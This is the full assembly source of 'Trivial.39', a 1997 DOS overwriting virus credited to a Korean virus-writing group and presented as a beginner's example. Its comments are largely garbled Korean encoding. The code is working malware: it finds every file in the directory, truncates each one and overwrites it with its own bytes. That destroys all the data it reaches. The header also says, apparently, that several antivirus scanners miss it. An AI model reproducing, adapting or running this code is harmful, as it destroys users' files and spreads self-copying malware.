;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                         Trivial.39                           CVC #02  97/09
;
;  VirusName : Trivial.39
;  Author : Osiris
;  Group : CVC (Corean Virus Club) / Corea
;  Date : 1997/08/15
;
;  Type : Non Resident  Overwriting
;
;  for Beginers
;
;  From the Corean Virus Factory !
;
;  ���w���w �s�a�a�� �a����a���a. �a�w �e�e�e �a����a�� �e�� ���Bɡ����
;  ���e �a���i �a�A�e�a.
;
;  AVP,FINDVIRU,F-PROT,SCAN,V3PRO �A�� ���e�A�� �g�e�a.
;  �e, TBAV �A��e Vorbis.155/166 �� ���e�E�a.
;
;  !! ���� !!
;  �� ���a�e ���� �a�B�w�a���e �a�w�A�ᴡ �s���a. �� ���a�� ��Ё �i���e ���e
;  ���A�� �����e �a�w�a�A�A ���a�a �A�b�a�e ����e ������ ���� �g�s���a.
;
;                                   (c) Copyleft 1997 by Osiris of CVC, COREA
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 .MODEL TINY
 .CODE
  ORG   100h

 Start:
        mov   ah,4Eh                    ; AH = 4Eh (�a�� �x��)
        mov   cx,0                      ; CX = �a�� ����
        lea   dx, mask_all              ; DX = �x�i �a�� (*.* : ���e �a��)
 Find:
        int   21h                       ; ��З !
        jc    Done                      ; �A�� ���a ?

        mov   ah,3ch                    ; �a�� ����
        mov   dx,009Eh                  ; ���� DTA �t�e 0080h ���a. +1Eh �a
        int   21h                       ; �a�� ���q���a�� 9Eh �e �a�� ���q��
                                        ; �����e�a.
        xchg  ax,bx                     ; AX,BX �t�i �a���e�a. 1 �a���a �a��
                                        ; �w�w���a BX �e �a�� Ѕ�i�i �a���A
                                        ; �E�a.
        mov   ah,40h                    ; �a�� �a��
        mov   cx, offset End_Trivial - 100h   ; �a��
        mov   dx,100h                   ; �i ���a�U �����t
        int   21h                       ;

;       mov   ah,3Eh                    ; �a�� �h��
;       int   21h                       ; ���ᕡ �i ���A ���q
;       �a���e, �q�q ��ǩ �a�� �����a �g�a�e ���A�a ���� �� ���q

        mov   ah,4Fh                    ; �a�q �a�� �x��
        jmp   Find                      ;
 Done:
        RET                             ; PSP:0 �t�e CD 20h �b Int 20h ���a.
                                        ; �a���a���� ���a�E�a.
 Mask_All db '*.*',00                   ; ���e �a�� �x��
 End_Trivial:

        END    START
